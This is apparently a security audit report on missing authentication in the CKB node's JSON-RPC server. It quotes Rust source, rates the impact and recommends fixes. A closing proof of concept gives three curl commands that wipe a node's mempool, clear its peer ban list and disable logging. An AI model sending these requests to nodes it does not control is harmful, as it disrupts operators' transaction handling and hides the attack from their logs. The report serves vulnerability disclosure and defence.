### Title
Privileged RPC Operations Lack Any Authentication or Access Control — (`rpc/src/server.rs`, `rpc/src/module/pool.rs`, `rpc/src/module/net.rs`, `rpc/src/module/debug.rs`)

### Summary

The CKB JSON-RPC server exposes several privileged, state-mutating operations — including `clear_tx_pool`, `clear_tx_verify_queue`, `remove_transaction`, `set_ban`, `clear_banned_addresses`, `update_main_logger`, and `set_extra_logger` — with no authentication or authorization check of any kind. The `handle_jsonrpc` dispatcher processes every inbound request identically regardless of caller identity. When the node is configured to listen on a non-localhost address (a supported and documented configuration), any unprivileged network attacker can invoke these operations and cause immediate, concrete harm.

### Finding Description

**Root cause — no authentication layer in the RPC dispatcher**

`rpc/src/server.rs` `handle_jsonrpc` dispatches every request directly to the registered handler with no credential check, IP allowlist enforcement, or session token validation:

```rust
async fn handle_jsonrpc<T: Default + Metadata>(
    Extension(io): Extension<Arc<MetaIoHandler<T>>>,
    req_body: Bytes,
) -> Response {
    // ... parse JSON only, no auth check ...
    let result = io.handle_call(call, T::default()).await;
``` [1](#0-0) 

`rpc/src/service_builder.rs` mounts all privileged methods with no middleware:

```rust
pub fn enable_pool(...) -> Self {
    let methods = PoolRpcImpl::new(...);
    set_rpc_module_methods!(self, "Pool", pool_enable, add_pool_rpc_methods, methods)
}
``` [2](#0-1) 

**Privileged operations with no caller check**

`clear_tx_pool` and `clear_tx_verify_queue` in `rpc/src/module/pool.rs` wipe the entire mempool or verification queue unconditionally:

```rust
fn clear_tx_pool(&self) -> Result<()> {
    let snapshot = Arc::clone(&self.shared.snapshot());
    let tx_pool = self.shared.tx_pool_controller();
    tx_pool.clear_pool(snapshot)
        .map_err(|err| RPCError::custom(RPCError::Invalid, err.to_string()))?;
    Ok(())
}
``` [3](#0-2) 

`set_ban` and `clear_banned_addresses` in `rpc/src/module/net.rs` manipulate the peer ban list with no caller check:

```rust
fn clear_banned_addresses(&self) -> Result<()> {
    self.network_controller.clear_banned_addrs();
    Ok(())
}
``` [4](#0-3) 

`update_main_logger` and `set_extra_logger` in `rpc/src/module/debug.rs` alter runtime logging configuration with no caller check:

```rust
fn update_main_logger(&self, config: MainLoggerConfig) -> Result<()> {
    ...
    Logger::update_main_logger(filter, to_stdout, to_file, color)...
}
``` [5](#0-4) 

**Supported external exposure**

The RPC README explicitly documents that the server can be bound to non-localhost addresses via `rpc.listen_address`, `rpc.tcp_listen_address`, and `rpc.ws_listen_address`, and warns that doing so is dangerous — but provides no code-level mitigation:

> "Allowing arbitrary machines to access the JSON-RPC port (using the `rpc.listen_address` configuration option) is **dangerous and strongly discouraged**." [6](#0-5) 

The server startup code confirms all three transports are supported: [7](#0-6) 

### Impact Explanation

| Operation | Impact |
|---|---|
| `clear_tx_pool` | Wipes all pending transactions; miners lose fee revenue; user transactions are silently dropped and must be resubmitted; can be called in a loop to permanently prevent mempool accumulation |
| `clear_tx_verify_queue` | Drops all transactions awaiting script verification; same effect as above for the verification pipeline |
| `remove_transaction` | Targeted removal of any specific transaction by hash; attacker can selectively evict high-value or time-sensitive transactions |
| `clear_banned_addresses` | Clears the entire peer ban list; previously banned malicious peers (e.g., eclipse attackers, DoS sources) are immediately allowed to reconnect |
| `set_ban` | Bans arbitrary IP ranges; attacker can isolate the node from legitimate peers, enabling eclipse attacks |
| `update_main_logger` / `set_extra_logger` | Suppresses security-relevant log output; can redirect or disable logging to impair incident detection |

The `clear_tx_pool` + `set_ban` combination is particularly severe: an attacker can simultaneously isolate the node from the network and wipe its mempool, causing the node to stall and lose all unconfirmed transaction state.

### Likelihood Explanation

The RPC is designed to be reachable by any "RPC caller" (explicitly listed as a valid attacker profile in scope). Operators who follow deployment guides (e.g., the systemd guide at `devtools/init/linux-systemd/README.md`) bind the RPC to a specific address. Any misconfiguration — or intentional external exposure for DApp/wallet access — immediately exposes all privileged operations to the network with zero authentication barrier. No exploit tooling is required; a single `curl` POST suffices. [8](#0-7) 

### Recommendation

1. **Add an authentication layer to the RPC server** — implement token-based or HTTP Basic authentication enforced in `handle_jsonrpc` before dispatching any call.
2. **Separate privileged from unprivileged methods** — expose read-only methods on the public port and privileged mutating methods only on a separate, localhost-only administrative port.
3. **Enforce an IP allowlist in code** — do not rely solely on operator configuration; reject connections from non-allowlisted sources at the server level for privileged modules (Pool, Net, Debug).
4. **Document the risk explicitly per method** — each privileged RPC method (`clear_tx_pool`, `set_ban`, etc.) should carry a machine-readable `privileged: true` marker so tooling can enforce access policies.

### Proof of Concept

Assuming the node is configured with `listen_address = "0.0.0.0:8114"` (a supported value):

```bash
# Wipe the entire mempool — no credentials required
curl -s -X POST http://<node-ip>:8114/ \
  -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","method":"clear_tx_pool","params":[],"id":1}'
# Response: {"jsonrpc":"2.0","result":null,"id":1}

# Clear the peer ban list — allows previously banned attackers back in
curl -s -X POST http://<node-ip>:8114/ \
  -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","method":"clear_banned_addresses","params":[],"id":2}'
# Response: {"jsonrpc":"2.0","result":null,"id":2}

# Suppress all logging
curl -s -X POST http://<node-ip>:8114/ \
  -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","method":"update_main_logger","params":[{"filter":"off","to_stdout":false,"to_file":false,"color":null}],"id":3}'
# Response: {"jsonrpc":"2.0","result":null,"id":3}
```

Each call succeeds immediately with no authentication, no rate limiting, and no audit trail (since logging can itself be disabled by the same attacker).

### Citations

**File:** rpc/src/server.rs (L59-88)
```rust
        let http_address = Self::start_server(
            &rpc,
            config.listen_address.to_owned(),
            handler.clone(),
            false,
        )
        .inspect(|&local_addr| {
            info!("Listen HTTP RPCServer on address: {}", local_addr);
        })
        .unwrap();

        let ws_address = if let Some(addr) = config.ws_listen_address {
            let local_addr =
                Self::start_server(&rpc, addr, handler.clone(), true).inspect(|&addr| {
                    info!("Listen WebSocket RPCServer on address: {}", addr);
                });
            local_addr.ok()
        } else {
            None
        };

        let tcp_address = if let Some(addr) = config.tcp_listen_address {
            let local_addr = handler.block_on(Self::start_tcp_server(rpc, addr, handler.clone()));
            if let Ok(addr) = &local_addr {
                info!("Listen TCP RPCServer on address: {}", addr);
            };
            local_addr.ok()
        } else {
            None
        };
```

**File:** rpc/src/server.rs (L218-260)
```rust
async fn handle_jsonrpc<T: Default + Metadata>(
    Extension(io): Extension<Arc<MetaIoHandler<T>>>,
    req_body: Bytes,
) -> Response {
    let make_error_response = |error| {
        Json(jsonrpc_core::Failure {
            jsonrpc: Some(jsonrpc_core::Version::V2),
            id: jsonrpc_core::Id::Null,
            error,
        })
        .into_response()
    };

    let req = match std::str::from_utf8(req_body.as_ref()) {
        Ok(req) => req,
        Err(_) => {
            return make_error_response(jsonrpc_core::Error::parse_error());
        }
    };

    let req = serde_json::from_str::<Request>(req);
    match req {
        Err(_error) => {
            let response = RpcResponse::from(
                Error::new(ErrorCode::ParseError),
                Some(jsonrpc_core::Version::V2),
            );

            serde_json::to_string(&response)
                .map(|json| {
                    (
                        [(axum::http::header::CONTENT_TYPE, "application/json")],
                        json,
                    )
                        .into_response()
                })
                .unwrap_or_else(|_| StatusCode::INTERNAL_SERVER_ERROR.into_response())
        }
        Ok(request) => match request {
            Request::Single(call) => {
                let result = io.handle_call(call, T::default()).await;

                if let Some(response) = result {
```

**File:** rpc/src/service_builder.rs (L64-77)
```rust
    /// Mounts methods from module Pool if it is enabled in the config.
    pub fn enable_pool(
        mut self,
        shared: Shared,
        extra_well_known_lock_scripts: Vec<Script>,
        extra_well_known_type_scripts: Vec<Script>,
    ) -> Self {
        let methods = PoolRpcImpl::new(
            shared,
            extra_well_known_lock_scripts,
            extra_well_known_type_scripts,
        );
        set_rpc_module_methods!(self, "Pool", pool_enable, add_pool_rpc_methods, methods)
    }
```

**File:** rpc/src/module/pool.rs (L684-692)
```rust
    fn clear_tx_pool(&self) -> Result<()> {
        let snapshot = Arc::clone(&self.shared.snapshot());
        let tx_pool = self.shared.tx_pool_controller();
        tx_pool
            .clear_pool(snapshot)
            .map_err(|err| RPCError::custom(RPCError::Invalid, err.to_string()))?;

        Ok(())
    }
```

**File:** rpc/src/module/net.rs (L686-689)
```rust
    fn clear_banned_addresses(&self) -> Result<()> {
        self.network_controller.clear_banned_addrs();
        Ok(())
    }
```

**File:** rpc/src/module/debug.rs (L59-74)
```rust
    fn update_main_logger(&self, config: MainLoggerConfig) -> Result<()> {
        let MainLoggerConfig {
            filter,
            to_stdout,
            to_file,
            color,
        } = config;
        if filter.is_none() && to_stdout.is_none() && to_file.is_none() && color.is_none() {
            return Ok(());
        }
        Logger::update_main_logger(filter, to_stdout, to_file, color).map_err(|err| Error {
            code: InternalError,
            message: err,
            data: None,
        })
    }
```

**File:** rpc/README.md (L1-9)
```markdown
# CKB JSON-RPC Protocols

The RPC interface shares the version of the node version, which is returned in `local_node_info`. The interface is fully compatible between patch versions, for example, a client for 0.25.0 should work with 0.25.x for any x.

Allowing arbitrary machines to access the JSON-RPC port (using the `rpc.listen_address` configuration option) is **dangerous and strongly discouraged**. Please strictly limit the access to only trusted machines.

CKB JSON-RPC only supports HTTP now. If you need SSL, please set up a proxy via Nginx or other HTTP servers.

See [list of projects](https://github.com/topics/ckb-rpc-proxy) to setup the proxy for the RPC server.
```

**File:** devtools/init/linux-systemd/README.md (L1-30)
```markdown
# CKB systemd unit configuration

The provided files should work with systemd version 219 or later.

## Instructions

The following instructions assume that:

* you want to run ckb as user `ckb` and group `ckb`, and store data in `/var/lib/ckb`.
* you want to join mainnet.
* you are logging in as a non-root user account that has `sudo` permissions to execute commands as root.

First, get ckb and move the binary into the system binary directory, and setup the appropriate ownership and permissions:

```bash
sudo cp /path/to/ckb /usr/local/bin
sudo chown root:root /usr/local/bin/ckb
sudo chmod 755 /usr/local/bin/ckb
```

Setup the directories and generate config files for mainnet.

```bash
sudo mkdir /var/lib/ckb
sudo /usr/local/bin/ckb init -C /var/lib/ckb --chain mainnet --log-to stdout
```

Setup the user and group and the appropriate ownership and permissions.

```bash
```
